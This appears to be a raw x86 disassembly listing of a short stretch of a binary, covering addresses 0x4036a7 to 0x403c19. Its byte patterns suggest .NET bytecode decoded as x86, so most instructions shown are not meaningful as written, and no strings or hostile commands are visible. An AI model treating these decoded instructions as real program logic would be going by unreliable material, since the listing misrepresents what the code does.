  4036a7:	00 00                	add    %al,(%eax)
  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 3e             	es jb  0x403710
  4036d2:	24 00                	and    $0x0,%al
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	50                   	push   %eax
  40372d:	24 00                	and    $0x0,%al
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 56                	jb     0x4037d0
  40377a:	24 00                	and    $0x0,%al
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 6c 24 00       	and    $0x246c72,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 76 24 00       	and    $0x247672,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 80 24 00       	and    $0x248072,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 86                	jb     0x403753
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 9a             	or     -0x66(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	9e                   	sahf
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	a8 24                	test   $0x24,%al
  4037f0:	00 70 6f             	add    %dh,0x6f(%eax)
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 b4             	or     -0x4c(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	c0 24 00 70          	shlb   $0x70,(%eax,%eax,1)
  403801:	6f                   	outsl  %ds:(%esi),(%dx)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 cc 24 00       	and    $0x24cc72,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 d6 24 00       	and    $0x24d672,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 e6 24 00       	and    $0x24e672,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 f2             	or     -0xe(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	e6 24                	out    %al,$0x24
  40385f:	00 70 6f             	add    %dh,0x6f(%eax)
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 fc             	or     -0x4(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	76 24                	jbe    0x403892
  40386e:	00 70 6f             	add    %dh,0x6f(%eax)
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 08 25 00       	and    $0x250872,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 20 25 00       	and    $0x252072,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 32 25 00       	and    $0x253272,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 46 25 00       	and    $0x254672,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 5a 25 00       	and    $0x255a72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 b4                	jb     0x4038a9
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 64 25 00       	and    $0x256472,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 70             	adc    %esi,0x70(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 76             	or     0x76(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 a2             	or     -0x5e(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 e0    	or     0xe0720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 f8                	jb     0x403a0e
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 00             	add    %dh,0x0(%edx)
  403a22:	26 00 70 07          	add    %dh,%es:0x7(%eax)
  403a26:	6f                   	outsl  %ds:(%esi),(%dx)
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 f8                	jb     0x403a3f
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 b4             	add    %dh,-0x4c(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
